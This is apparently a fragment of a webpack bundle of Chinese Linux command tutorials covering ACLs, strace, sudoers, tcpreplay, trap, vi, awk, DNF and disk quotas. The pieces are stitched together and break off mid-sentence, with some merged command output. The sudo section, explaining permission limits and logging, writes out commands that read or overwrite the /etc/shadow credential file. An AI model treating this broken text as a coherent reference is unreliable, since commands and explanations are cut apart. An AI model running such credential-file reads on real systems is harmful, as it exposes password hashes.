对应了ACL_GROUP_OBJ和ACL_GROUP\\nmask   对应了ACL_MASK\\nother  对应了ACL_OTHER\\n</code></pre><p>第二个字段称之为qualifier，也就是上面例子中的john和dev组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有user和group才有qualifier，其他的都为空。第三个字段就是我们熟悉的permission了。它和Linux的permission一样定义，这里就不多讲了。</p>\\n<p>下面我们就来看一下怎么设置test.txt这个文件的ACL让它来达到我们上面的要求。</p>\\n<p>一开始文件没有ACL的额外属性：</p>\\n<pre><code>[root@localhost ~]# [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) -l\\n-rw-rw-r-- 1 root admin 0 Jul 3 22:06 test.txt\\n\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw- group::rw- other::r--\\n</code></pre><p>我们先让用户john拥有对test.txt文件的读写权限：</p>\\n<pre><code>[root@localhost ~]# setfacl -m user:john:rw- ./test.txt\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\nmask::rw-\\nother::r--\\n</code></pre><p>这时我们就可以看到john用户在ACL里面已经拥有了对文件的读写权。这个时候如果我们查看一下linux的permission我们还会发现一个不一样的地方。</p>\\n<pre><code>[root@localhost ~]# ls -l ./test.txt\\n-rw-rw-r--+ 1 root admin 0 Jul 3 22:06 ./test.txt\\n</code></pre><p>在文件permission的最后多了一个+号，当任何一个文件拥有了ACL_USER或者ACL_GROUP的值以后我们就可以称它为ACL文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了<code>ACL_USER</code>或者<code>ACL_GROUP</code>的值时<code>ACL_MASK</code>同时也会被定义。</p>\\n<p>接下来我们来设置dev组拥有read permission：</p>\\n<pre><code>[root@localhost ~]# setfacl -m group:dev:r-- ./test.txt\\n[root@localhost ~]# getfacl --omit-header ./test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rw-\\ngroup:dev:r--\\nmask::rw-\\nother::r--\\n</code></pre><p>到这里就完成了我们上面讲到的要求，是不是很简单呢。</p>\\n<p><strong>ACL_MASK和Effective permission</strong></p>\\n<p>这里需要重点讲一下<code>ACL_MASK</code>，因为这是掌握ACL的另一个关键，在Linux file permission里面大家都知道比如对于<code>rw-rw-r--</code>来说, 当中的那个<code>rw-</code>是指文件组的permission. 但是在ACL里面这种情况只是在<code>ACL_MASK</code>不存在的情况下成立。如果文件有ACL_MASK值，那么当中那个<code>rw-</code>代表的就是mask值而不再是group permission了。</p>\\n<p>让我们来看下面这个例子：</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxrw-r-- 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p>这里说明test.sh文件只有file owner: root拥有read, write, execute/search permission。admin组只有read and write permission，现在我们想让用户john也对test.sh具有和root一样的permission。</p>\\n<pre><code>[root@localhost ~]# setfacl -m user:john:rwx ./test.sh\\n[root@localhost ~]# getfacl --omit-header ./test.sh\\nuser::rwx user:john:rwx\\ngroup::rw-\\nmask::rwx\\nother::r--\\n</code></pre><p>这里我们看到john已经拥有了rwx的permission，mask值也被设定为rwx，那是因为它规定了<code>ACL_USER</code>，<code>ACL_GROUP</code>和<code>ACL_GROUP_OBJ</code>的最大值，现在我们再来看test.sh的Linux permission，它已经变成了：</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxrwxr--+ 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p>那么如果现在admin组的用户想要执行test.sh的程序会发生什么情况呢？它会被permission deny。原因在于实际上admin组的用户只有read and write permission，这里当中显示的rwx是<code>ACL_MASK</code>的值而不是group的permission。</p>\\n<p>所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用getfacl来确认它的permission，以免发生混淆。</p>\\n<p>下面我们再来继续看一个例子，假如现在我们设置test.sh的mask为read only，那么admin组的用户还会有write permission吗？</p>\\n<pre><code>[root@localhost ~]# setfacl -m mask::r-- ./test.sh\\n[root@localhost ~]# getfacl --omit-header ./test.sh\\nuser::rwx\\nuser:john:rwx   #effective:r--\\ngroup::rw-      #effective:r--\\nmask::r--\\nother::r--\\n</code></pre><p>这时候我们可以看到ACL_USER和ACL_GROUP_OBJ旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下<code>ACL_MASK</code>的定义。它规定了<code>ACL_USER</code>，<code>ACL_GROUP_OBJ</code>和<code>ACL_GROUP</code>的最大权限。那么在我们这个例子中他们的最大权限也就是read only。虽然我们这里给<code>ACL_USER</code>和<code>ACL_GROUP_OBJ</code>设置了其他权限，但是他们真正有效果的只有read权限。</p>\\n<p>这时我们再来查看test.sh的Linux file permission时它的group permission也会显示其mask的值(i.e. r--)</p>\\n<pre><code>[root@localhost ~]# ls -l\\n-rwxr--r--+ 1 root admin 0 Jul 3 23:10 test.sh\\n</code></pre><p><strong>Default ACL</strong></p>\\n<p>上面我们所有讲的都是Access ACL，也就是对文件而言。下面我简单讲一下Default ACL。Default ACL是指对于一个目录进行Default ACL设置，并且在此目录下建立的文件都将继承此目录的ACL。</p>\\n<p>同样我们来做一个试验说明，比如现在root用户建立了一个dir目录：</p>\\n<pre><code>[root@localhost ~]# [mkdir](https://philipding.github.io/linux-command/mkdir &quot;mkdir命令&quot;) dir\\n</code></pre><p>他希望所有在此目录下建立的文件都可以被john用户所访问，那么我们就应该对dir目录设置Default ACL。</p>\\n<pre><code>[root@localhost ~]# setfacl -d -m user:john:rw ./dir\\n[root@localhost ~]# getfacl --omit-header ./dir\\nuser::rwx\\ngroup::rwx\\nother::r-x\\ndefault:user::rwx\\ndefault:user:john:rwx\\ndefault:group::rwx\\ndefault:mask::rwx\\ndefault: other::r-x\\n</code></pre><p>这里我们可以看到ACL定义了default选项，john用户拥有了default的read, write, excute/search permission。所有没有定义的default都将从file permission里copy过来，现在root用户在dir下建立一个test.txt文件。</p>\\n<pre><code>[root@localhost ~]# [touch](https://philipding.github.io/linux-command/touch &quot;touch命令&quot;) ./dir/test.txt\\n[root@localhost ~]# ls -l ./dir/test.txt\\n-rw-rw-r--+ 1 root root 0 Jul 3 23:46 ./dir/test.txt\\n\\n[root@localhost ~]# getfacl --omit-header ./dir/test.txt\\nuser::rw-\\nuser:john:rw-\\ngroup::rwx #effective:rw-\\nmask::rw-\\nother::r--\\n</code></pre><p>这里我们看到在dir下建立的文件john用户自动就有了read and write

page。我只想提及一下<code>chacl -B</code>。它可以彻底删除文件或者目录的ACL属性(包括Default ACL)，比如你即使用了<code>setfacl -x</code>删除了所有文件的ACL属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用<code>chacl -B</code>用<a

id=\\\"-\\\">常用参数说明</h3>\\n<p>除了-c参数之外，strace还提供了其他有用的参数给我们，让我们能很方便的得到自己想要的信息，下面就对那些常用的参数一一做个介绍。</p>\\n<p><strong>重定向输出</strong></p>\\n<p>参数-o用在将strace的结果输出到文件中，如果不指定-o参数的话，默认的输出设备是STDERR，也就是说使用”-o filename”和” 2&gt;filename”的结果是一样的。</p>\\n<pre><code># 这两个命令都是将strace结果输出到文件test.txt中\\nstrace -c -o test.txt ./test\\nstrace -c ./test  2&gt;test.txt\\n</code></pre><p><strong>对系统调用进行计时</strong></p>\\n<p>strace可以使用参数-T将每个系统调用所花费的时间打印出来，每个调用的时间花销现在在调用行最右边的尖括号里面。</p>\\n<pre><code>oracle@orainst[orcl]:~\\n$strace -T ./test\\n\\n// 这里只摘录部分结果\\nread(0, 1\\n&quot;1\\\\n&quot;, 1024)                    = 2 &lt;2.673455&gt;\\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 &lt;0.000014&gt;\\nmmap2(NULL, 4096,

?\\n</code></pre><p><strong>系统调用的时间</strong></p>\\n<p>这是一个很有用的功能，strace会将每次系统调用的发生时间记录下来，只要使用-t/tt/ttt三个参数就可以看到效果了，具体的例子可以自己去尝试。</p>\\n<table>\\n\\n<thead>\\n\\n<tr>\\n\\n<th>参数名</th>\\n\\n<th>输出样式</th>\\n\\n<th>说明</th>\\n\\n</tr>\\n\\n</thead>\\n\\n<tbody>\\n\\n<tr>\\n\\n<td>-t</td>\\n\\n<td>10:33:04

-s 20 ./test\\n\\nread(0, 2222222222222222222222222      // 我们输入的2一共有25个\\n&quot;22222222222222222222&quot;..., 1024) = 26  // 而我们看到的结果中2只有20个\\n</code></pre><p><strong>trace一个现有的进程</strong></p>\\n<p>strace不光能自己初始化一个进程进行trace，还能追踪现有的进程，参数-p就是取这个作用的，用法也很简单，具体如下。</p>\\n<pre><code>strace -p pid\\n</code></pre><h3 id=\\\"-\\\">综合例子</h3>\\n<p>说了那么多的功能和参数，现在我们来一个实用点的，就是研究下Oracle的lgwr进程，看看这个进程是不是像文档所说的那样没3s钟写一次log文件，考虑到lgwr写日志的触发条件比较多，我们需要找一个空闲的Oracle实例做这个实验。</p>\\n<p>我们先要得到lgwr进程的pid，运行下面的命令</p>\\n<pre><code>[ps](https://philipding.github.io/linux-command/ps

5912\\n</code></pre><p>过一会之后停止strace，然后查看结果。由于输出的结果比较多，为了方便我们只看Oracle写入log文件时用的pwrite函数的调用</p>\\n<pre><code>grep pwrite\\\\(20

href=\\\"https://philipding.github.io/linux-command/vi\\\" title=\\\"vi命令\\\">vi</a>里打开配置文件，用vi来修改文件。我们可以在编译时修改这个默认项。visudo不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像：</p>\\n<pre><code>&gt;&gt;&gt;

ALL=(ALL)ALL\\n</code></pre><p>我们一看就明白个差不多了，root有所有权限，只要仿照现有root的例子就行，我们在下面加一行（最好用tab作为空白）：</p>\\n<pre><code>foobar ALL=(ALL)    ALL\\n</code></pre><p>保存退出后，切换到foobar用户，我们用它的身份执行命令：</p>\\n<pre><code>[foobar@localhost ~]$ [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) /root\\nls: /root:

install.log.syslog\\n</code></pre><p>好了，我们限制一下foobar的权利，不让他为所欲为。比如我们只想让他像root那样使用ls和<a href=\\\"https://philipding.github.io/linux-command/ifconfig\\\" title=\\\"ifconfig命令\\\">ifconfig</a>，把那一行改为：</p>\\n<pre><code>foobar localhost=    /sbin/ifconfig,   /bin/ls\\n</code></pre><p>再来执行命令：</p>\\n<pre><code>[foobar@localhost ~]$ sudo [head](https://philipding.github.io/linux-command/head &quot;head命令&quot;) -5 /etc/shadow\\nPassword:\\nSorry, user foobar is not allowed to execute &#39;/usr/bin/head -5 /etc/shadow&#39; [as](https://philipding.github.io/linux-command/as &quot;as命令&quot;) root on localhost.localdomain.\\n\\n[foobar@localhost ~]$ sudo /sbin/ifconfigeth0      Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B...\\n</code></pre><p>现在让我们来看一下那三个ALL到底是什么意思。第一个ALL是指网络中的主机，我们后面把它改成了主机名，它指明foobar可以在此主机上执行后面的命令。第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL当然就是指命令名了。例如，我们想让foobar用户在linux主机上以jimmy或rene的身份执行<a href=\\\"https://philipding.github.io/linux-command/kill\\\" title=\\\"kill命令\\\">kill</a>命令，这样编写配置文件：</p>\\n<pre><code>foobar    linux=(jimmy,rene)    /bin/kill\\n</code></pre><p>但这还有个问题，foobar到底以jimmy还是rene的身份执行？这时我们应该想到了<code>sudo -u</code>了，它正是用在这种时候。 foobar可以使用<code>sudo -u jimmy kill PID</code>或者<code>sudo -u rene kill PID</code>，但这样挺麻烦，其实我们可以不必每次加<code>-u</code>，把rene或jimmy设为默认的目标用户即可。再在上面加一行：</p>\\n<pre><code>Defaults:foobar    runas_default=rene\\n</code></pre><p>Defaults后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行：</p>\\n<pre><code>Defaults    env_reset\\n</code></pre><p>另一个问题是，很多时候，我们本来就登录了，每次使用sudo还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件：</p>\\n<pre><code>foobar localhost=NOPASSWD:     /bin/[cat](https://philipding.github.io/linux-command/cat &quot;cat命令&quot;), /bin/ls\\n</code></pre><p>再来sudo一下：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log\\ninstall.log.syslog\\n</code></pre><p>当然，你也可以说“某些命令用户foobar不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从ALL中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。</p>\\n<p><strong>日志与安全</strong></p>\\n<p>sudo为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo的日志功能不是自动的，必须由管理员开启。这样来做：</p>\\n<pre><code>[touch](https://philipding.github.io/linux-command/touch &quot;touch命令&quot;) /var/log/sudo\\nvi /etc/syslog.conf\\n</code></pre><p>在syslog.conf最后面加一行（必须用tab分割开）并保存：</p>\\n<pre><code>local2.debug                    /var/log/sudo\\n</code></pre><p>重启日志守候进程，</p>\\n<pre><code>[ps](https://philipding.github.io/linux-command/ps &quot;ps命令&quot;) aux [grep](https://philipding.github.io/linux-command/grep &quot;grep命令&quot;) syslogd\\n</code></pre><p>把得到的syslogd进程的PID（输出的第二列是PID）填入下面：</p>\\n<pre><code>kill –HUP PID\\n</code></pre><p>这样，sudo就可以写日志了：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg\\nDesktop install.log\\ninstall.log.syslog\\n$cat /var/log/sudoJul 28 22:52:54 localhost sudo:   foobar :\\nTTY=pts/1 ; [pwd](https://philipding.github.io/linux-command/pwd &quot;pwd命令&quot;)=/home/foobar ; USER=root ; [command](https://philipding.github.io/linux-command/command &quot;command命令&quot;)=/bin/ls /root\\n</code></pre><p>不过，有一个小小的“缺陷”，sudo记录日志并不是很忠实：</p>\\n<pre><code>[foobar@localhost ~]$ sudo cat /etc/shadow &gt; /dev/null\\ncat /var/log/sudo...Jul 28 23:10:24 localhost sudo:   foobar : TTY=pts/1 ;\\nPWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow\\n</code></pre><p>重定向没有被记录在案！为什么？因为在命令运行之前，shell把重定向的工作做完了，sudo根本就没看到重定向。这也有个好处，下面的手段不会得逞：</p>\\n<pre><code>[foobar@localhost ~]$ sudo ls /root &gt; /etc/shadowbash: /etc/shadow: 权限不够\\n</code></pre><p>sudo 有自己的方式来保护安全。以root的身份执行<code>sudo-V</code>，查看一下sudo的设置。因为考虑到安全问题，一部分环境变量并没有传递给sudo后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL等。当然，你也可以通过sudoers来配置这些环境变量。</p>\\n\";\n\n/***/ }),\n/* 475 */\n/***/

指定循环的次数。\\n-L &lt;limit&gt; 指定最大的发包数量。可以在确认连接的调试时使用。 \\n-m &lt;multiple&gt; 指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。 加大发送的速率后，对于DUT可能意味着有更多的并发连接和连接数，特别是对于BT报文的重放， 因为连接的超时是固定的，如果速率增大的话， 留在session表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。\\n-M 表示不发送“火星”的ip报文，[man](https://philipding.github.io/linux-command/man &quot;man命令&quot;)文件中的定义是 0/8、172/8、 255/8。\\n-n 在使用-S参数，不对混杂模式进行侦听。\\n-N &lt;CIDR1:CIDR2,...&gt; 通过伪造的NAT，重写IP地址。这个参数应该有很重要的应用，目前没有测试使用。\\n-O 没有测试使用。\\n-p &lt;packetrate&gt; 指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。\\n-P 表示在输出信息中打印PID的信息，用于单用户或单帐户模式下暂停和重启程序。\\n-r &lt;rate&gt; 指定发送的速率。目前-m/-r/-p这3个参数的相互关系。\\n-R 让网卡极限速度发数据包。 \\n-t &lt;mtu&gt; 指定MTU，标准的10/100M网卡的默认值是1500。 \\n-T Truncate packets &gt; 截去报文中MTU大于标准值的部分再发送出去，默认是不发送，skip掉。\\n-v 每发送一个报文都以 tcpdump 的风格打印出对应的信息。\\n-V 查看版本号。\\n-w &lt;[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;)&gt;

Break 键在终端一个shell程序的执行过程中，正常程序将立即终止，并返回命令提示符。这可能并不总是可取的。例如，你可能最终留下了一堆临时文件，将不会清理。</p>\\n<p>捕获这些信号是很容易的，trap命令的语法如下：</p>\\n<pre><code>$ trap commands signals\\n</code></pre><p>这里的命令可以是任何有效的Linux命令，或一个用户定义的函数，信号可以是任意数量的信号，你想来捕获的列表。</p>\\n<p>在shell脚本中的陷阱有三种常见的用途：</p>\\n<ol>\\n<li>清理临时文件</li>\\n<li>忽略信号</li>\\n</ol>\\n<p><strong>1、清理临时文件：</strong></p>\\n<p>trap命令作为一个例子，下面展示了如何可以删除一些文件，然后退出，如果有人试图从终端中止程序：</p>\\n<pre><code>trap &quot;[rm](https://philipding.github.io/linux-command/rm &quot;rm命令&quot;) -f $WORKDIR/work1$ $WORKDIR/dataout$; exit&quot; 2\\n</code></pre><p>执行shell程序，这个陷阱的角度，这两个文件work1$$ 和 dataout$$将被自动删除，如果程序接收信号数为2。</p>\\n<p>因此，用户中断执行，如果执行的程序后，这个陷阱你可以放心，这两个文件将被清理。 exit 命令如下 rm 是必要的，因为没有它的执行将继续在节目中的一点，它离开时收到信号。</p>\\n<p>1号信号产生挂断：要么有人故意挂断线路或线路被意外断开。</p>\\n<p>您可以修改前面的陷阱也删除指定的文件，在这种情况下，两个信号信号1号添加到列表：</p>\\n<pre><code>$ trap &quot;rm $WORKDIR/work1$ $WORKDIR/dataout$; exit&quot; 1 2\\n</code></pre><p>现在，这些文件将被删除，如果该行被挂了，或者按Ctrl c键被按下。</p>\\n<p>来捕获指定的命令必须用引号括起来，如果它们包含一个以上的命令。另外请注意，在 shell 命令行扫描 trap 命令得到执行，并再次当一个所列出的的信号被接收的时间。</p>\\n<p>WORKDIR 值 $$ 所以在前面的例子中，将被取代 trap 命令执行的时间。如果你想这种替代发生在收到信号1或2的时间你可以把单引号内的命令：</p>\\n<pre><code>$ trap &#39;rm $WORKDIR/work1$ $WORKDIR/dataout$; exit&#39; 1 2\\n</code></pre><p><strong>2、忽略信号：</strong></p>\\n<p>如果陷阱列出的命令是空的，指定的信号接收时，将被忽略。例如，下面的命令：</p>\\n<pre><code>$ trap &#39;&#39; 2\\n</code></pre><p>指定的中断信号是被忽略的。你可能要忽略某些信号时进行一些操作，不希望打断。可以指定多个信号被忽略如下：</p>\\n<pre><code>$ trap &#39;&#39; 1 2 3 15\\n</code></pre><p>注意，第一个参数必须被指定为一个信号被忽略，而不是相当于写入下面的内容，它具有独立的含义也各有：</p>\\n<pre><code>$ trap  2\\n</code></pre><p>如果你忽略了一个信号，所有的子shell也忽略该信号。不过，如果指定要采取的行动在收到的信号，所有的子shell仍然会在收到该信号的默认操作。</p>\\n<p><strong>3、重设陷阱：</strong></p>\\n<p>当你改变了默认在收到信号后应采取的动作，你可以改变它回来的陷阱，如果你只是省略第一个参数;</p>\\n<pre><code>$ trap 1 2\\n</code></pre><p>复位应采取的动作收到信号1或2返回默认。</p>\\n\";\n\n/***/ }),\n/* 504 */\n/***/ (function(module, exports) {\n\nmodule.exports = \"<p><strong>tree命令</strong>以树状图列出目录的内容。</p>\\n<h3

title=\\\"ex命令\\\">ex</a>转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。</p>\\n<p><strong>命令方式</strong></p>\\n<p>在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。</p>\\n<p><strong>输入方式</strong></p>\\n<p>通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。</p>\\n<p>由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。</p>\\n<p><strong>ex转义方式</strong></p>\\n<p>vi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：</p>\\n<pre><code>:1,$s/I/i/g 按Enter键\\n</code></pre><p>则从文件第一行至文件末尾（$）将大写I全部替换成小写i。vi编辑器的三种工作方式之间的转换如图所示。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2013/11/vi.jpg\\\"

} END{ print &quot;end&quot; }&#39; file\\n</code></pre><p>一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被<strong>单引号</strong>或<strong>双引号</strong>中，例如：</p>\\n<pre><code>awk &#39;BEGIN{ i=0 } { i++ } END{ print i }&#39; filename\\nawk &quot;BEGIN{ i=0 } { i++ } END{ print i }&quot; filename\\n</code></pre><h3 id=\\\"awk-\\\">awk的工作原理</h3>\\n<pre><code>awk &#39;BEGIN{ commands } pattern{ commands } END{ commands }&#39;\\n</code></pre><ul>\\n<li>第一步：执行<code>BEGIN{ commands }</code>语句块中的语句；</li>\\n<li>第二步：从文件或标准输入(stdin)读取一行，然后执行<code>pattern{ commands }</code>语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。</li>\\n<li>第三步：当读至输入流末尾时，执行<code>END{ commands }</code>语句块。</li>\\n</ul>\\n<p><strong>BEGIN语句块</strong>在awk开始从输入流中读取行<strong>之前</strong>被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。</p>\\n<p><strong>END语句块</strong>在awk从输入流中读取完所有的行<strong>之后</strong>即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。</p>\\n<p><strong>pattern语句块</strong>中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行<code>{ print }</code>，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。</p>\\n<p><strong>示例</strong></p>\\n<pre><code>[echo](https://philipding.github.io/linux-command/echo &quot;echo命令&quot;) -e &quot;A line 1nA line 2&quot; | awk &#39;BEGIN{ print &quot;Start&quot; } { print } END{ print &quot;End&quot; }&#39;\\nStart\\nA line 1\\nA line 2\\nEnd\\n</code></pre><p>当使用不带参数的<code>print</code>时，它就打印当前行，当<code>print</code>的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：</p>\\n<pre><code>echo | awk &#39;{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1,var2,var3; }&#39; \\nv1 v2 v3\\n</code></pre><p>双引号拼接使用：</p>\\n<pre><code>echo | awk &#39;{ var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1&quot;=&quot;var2&quot;=&quot;var3; }&#39;\\nv1=v2=v3\\n</code></pre><p>{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。</p>\\n<h2

最后一个系统错误的描述。\\n[G] **FIELDWIDTHS** 字段宽度列表（用空格键分隔）。\\n[A] **FILENAME** 当前输入文件的名。\\n[P] **FNR** 同NR，但相对于当前文件。\\n[A] **FS** 字段分隔符（默认是任何空格）。\\n[G] **IGNORECASE** 如果为真，则进行忽略大小写的匹配。\\n[A] **NF** 表示字段数，在执行过程中对应于当前的字段数。\\n[A] **NR** 表示记录数，在执行过程中对应于当前的行号。\\n[A] **OFMT** 数字的输出格式（默认值是%.6g）。\\n[A] **OFS** 输出字段分隔符（默认值是一个空格）。\\n[A] **ORS** 输出记录分隔符（默认值是一个换行符）。\\n[A] **RS** 记录分隔符（默认是一个换行符）。\\n[N]

filename\\n</code></pre><p>以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。</p>\\n<p>一个每一行中第一个字段值累加的例子：</p>\\n<pre><code>[seq](https://philipding.github.io/linux-command/seq

}&#39;\\n</code></pre><p>另一种传递外部变量方法：</p>\\n<pre><code>var1=&quot;aaa&quot;\\nvar2=&quot;bbb&quot;\\necho | awk &#39;{ print v1,v2 }&#39; v1=$var1 v2=$var2\\n</code></pre><p>当输入来自于文件时使用：</p>\\n<pre><code>awk &#39;{ print v1,v2 }&#39; v1=$var1 v2=$var2 filename\\n</code></pre><p>以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。</p>\\n<h2 id=\\\"awk-\\\">awk运算与判断</h2>\\n<p>作为一种程序设计语言所应具有的特点之一，awk支持多种运算，这些运算与C语言提供的基本相同。awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式~（匹配）和~!（不匹配）。作为对测试的一种扩充，awk也支持用逻辑运算符。</p>\\n<h3

明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如<code>cut fl f2 &gt; f3</code>将把文件fl和几的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件f3中。</p>\\n<p>当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用<a href=\\\"https://philipding.github.io/linux-command/more\\\" title=\\\"more命令\\\">more</a>等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。</p>\\n<h3

href=\\\"https://philipding.github.io/linux-command/yum\\\" title=\\\"yum命令\\\">yum</a>，正式成为 Fedora 22 的包管理器。</p>\\n<p>DNF包管理器克服了YUM包管理器的一些瓶颈，提升了包括用户体验，内存占用，依赖分析，运行速度等多方面的内容。DNF使用 RPM, libsolv 和 hawkey 库进行包管理操作。尽管它没有预装在 CentOS 和 RHEL 7 中，但你可以在使用 YUM 的同时使用 DNF 。你可以在这里获得关于 DNF 的更多知识：<a href=\\\"http://www.tecmint.com/dnf-next-generation-package-management-utility-for-linux/\\\">《 DNF 代替 YUM

7系统中，但是 Fedora 22 已经默认使用 DNF .</p>\\n<p>1、为了安装 DNF ，您必须先安装并启用 epel-release 依赖。</p>\\n<p>在系统中执行以下命令：</p>\\n<pre><code># yum [install](https://philipding.github.io/linux-command/install &quot;install命令&quot;) epel-release\\n</code></pre><p>或者</p>\\n<pre><code># yum install epel-release -y\\n</code></pre><p>其实这里并没有强制使用”-y”的理由，相反的，在不使用”-y”的情况下，用户可以在安装过程中查看到底有哪些东西被安装进了系统。但对于没有这个需求的用户，您可以在 YUM 中使用”-y”参数来自动安装所有东西。</p>\\n<p>2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令：</p>\\n<pre><code># yum install dnf\\n</code></pre><p>然后， DNF 包管理器就被成功的安装到你的系统中了。接下来，是时候开始我们的教程了！在这个教程中，您将会学到27个用于 DNF 包管理器的命令。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，让我们开始学习 DNF

中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。</li>\\n</ol>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/dnf.md\n// module id = 133\n// module chunks =

/etc/fstab\\n</code></pre><p>找到对应于<code>/home</code>和<code>/www</code>的行，例如：</p>\\n<pre><code>/dev/sda5 /home ext2 defaults 1 2\\n/dev/sda7 /www ext2 defaults 1 2\\n</code></pre><p>在<code>/home</code>里实现用户级的磁盘配额，所以对sda5行的挂装选项域做如下修改：</p>\\n<pre><code>/dev/sda5 /home ext2 defaults，usrquota 1 2\\n</code></pre><p>注意，是usrquota哦。类似的，我们可以如下修改<code>/www</code>行：</p>\\n<pre><code>/dev/sda7 /www ext2 defaults，grpquota 1 2\\n</code></pre><p>如编辑根用户</p>\\n<p>改<code>/etc/fstab</code>文件中</p>\\n<pre><code>LABEL=/ / ext2 defaults,usrquota,grpquota 1 